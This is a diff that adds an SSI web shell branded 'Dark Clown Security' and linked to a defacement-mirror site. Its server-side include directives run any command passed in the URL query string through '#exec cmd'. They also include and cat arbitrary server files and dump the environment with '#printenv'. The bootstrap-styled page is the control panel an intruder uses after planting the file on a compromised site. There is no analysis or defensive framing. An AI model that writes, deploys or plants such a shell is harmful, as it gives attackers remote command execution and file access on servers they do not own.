@@ -1,0 +1,132 @@
+
+<!--#config errmsg="[Error in shell]"-->
+<!--#set var="zero" value="" -->
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="shl" value="ls -al" -->
+<!--#else -->
+<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="inc" value="pwd" -->
+<!--#else -->
+<!--#set var="inc" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+<!DOCTYPE html>
+<!--Kalau Mau Recode Izin Dulu Bos-->
+<!--Jangan Maunya Ngambil Punya Orang Terus-->
+<!-- Gabisa HTML ? JAVASCRIPT -->
+<!-- heker ko recode -->
+<!-- Tolol Bet -->
+<html>
+<head>	
+	<title>SSI Dark Clown Security</title>
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+	<link href="https://fonts.googleapis.com/css2?family=Open+Sans&family=Piedra&display=swap" rel="stylesheet">
+	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous"  rel="stylesheet">
+<script language="javascript">
+function fex()
+{
+document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+document.getElementById('command').value;
+}
+function vfile()
+{
+document.location.href="<!--#echo var=DOCUMENT_NAME -->?cat "+document.getElementById('vfile').value;
+}
+</script>
+</head>
+<body>
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+<!-- Badan -->
+<body bgcolor=black alink=blue vlink=blue>
+	<style type="text/css">
+		@media screen and (max-width: 520px) {
+	table.responsive {
+		width: 100%;
+	}
+	thead {
+		display: none;
+	}
+	td {
+		display: block;
+		text-align: right;
+		border-right: 1px solid #e1edff;
+	}
+	td::before {
+		float: left;
+		text-transform: uppercase;
+		font-weight: bold;
+		content: attr(data-header);
+	}
+}
+	</style>
+	<div class="alert alert-success" role="alert">
+		<center><b><h1 style="font-family: Piedra; color: red;"><a href=http://tools.zone-dark.com>Server Side Include</a></h1></b>
+		<button type="button" class="btn btn-warning"><i class="fa fa-cog" aria-hidden="true"><a href="http://tools.zone-dark.com"> Tools Online</i></a></button>
+		<button type="button" class="btn btn-success"><i class="app-menu__icon fab fa-hackerrank" aria-hidden="true"><a href="https://zone-dark.com"> Mirror Defacer</i></a></button>
+		<button type="button" class="btn btn-danger"><i class="fa fa-user-secret" aria-hidden="true"><a href="https://team.zone-dark.com"> Team DCS</i></a></button>
+		<br><h6 style="font-family: Piedra; color: red;">Coded By : Mr.TenAr</h6>
+		<h6 style="font-family: Piedra; color: red;">~ Dark Clown Security ~</h6>
+	</center>
+	</div>
+	<div class="alert alert-success" role="alert">
+		<table class="table">
+		<center><b><h5 style="font-family: Piedra; color: red;">Shell Info</h5></b></center><hr>
+  <thead>
+		<tr class="alert alert-success">
+			<th>GMT Date</th>
+			<th>Local date</th>
+			<th>Document name</th>
+			<th>Document URI</th>
+			<th>Last modified</th>
+			<th>Owner</th>
+		</tr>
+	</thead>
+		<tbody>
+		<tr>
+			<td class="alert alert-success"><b><p class="text-danger"><!--#echo var=DATE_GMT --></p></b></td>
+			<td class="alert alert-success"><b><p class="text-danger"><!--#echo var=DATE_LOCAL --></p></b></td>
+			<td class="alert alert-success"><b><p class="text-danger"><!--#echo var=DOCUMENT_NAME --></p></b></td>
+			<td class="alert alert-success"><b><p class="text-danger"><!--#echo var=DOCUMENT_URI --></p></b></td>
+			<td class="alert alert-success"><b><p class="text-danger"><!--#echo var=LAST_MODIFIED --></p></b></td>
+			<td class="alert alert-success"><b><p class="text-danger"><!--#echo var=USER_NAME --></p></b></td>
+		</tr>
+	</tbody>
+  </thead>
+</div>
+</table>
+</div>
+	<div class="alert alert-success" role="alert">
+		<center><b><h5 style="font-family: Piedra; color: red;">Command for shell & address for inclusion</h5></b></center><hr>
+		<br>
+		<b><h6 style="font-family: Piedra; color: green;">Enter command/address:</h6></b><input class="form-control" type=text size=80 id=command><br><input class="btn btn-success" type=button value=Execute onclick=fex();> <button class="btn btn-danger" type="reset">hapus</button>
+		<br>
+	</div>
+	<div class="alert alert-success" role="alert">
+		<center><b><h5 style="font-family: Piedra; color: red;">Shell</h5></b></center><hr>
+		<b><h6 style="font-family: Piedra; color: green;">Executed command:</h6><b><!--#echo var=shl --></b><br>
+	<textarea class="form-control" cols=100 rows=10>
+	<!--#exec cmd=$shl -->
+	</textarea>
+	</div>
+	<div class="alert alert-success" role="alert">
+		<center><b><h5 style="font-family: Piedra; color: red;">Operations on files</h5></b></center>
+<br>
+<b><h5 style="font-family: Piedra; color: red;">View file (cat) :</h5></b><input  class="form-control" type=text size=80 id=vfile value=<!--#echo var=SCRIPT_FILENAME -->><br><input class="btn btn-success" type=button value=Run onclick=vfile();> <button class="btn btn-danger" type="reset">hapus</button><br><br>
+<b><h5 style="font-family: Piedra; color: red;">Included file :</h5></b><b><!--#echo var=inc --></b><br>
+<textarea bgcolor=#e4e0d8 cols=121 rows=15>
+<!--#include virtual=$inc -->
+</textarea>
+	</div>
+	<div class="alert alert-success" role="alert">
+		<center><b><h5 style="font-family: Piedra; color: red;">Server Info</h5></b></center><hr>
+	<br>
+	<pre><!--#printenv-->
+	</pre>
+	<br>
+	</div>
+</body>
+</html>
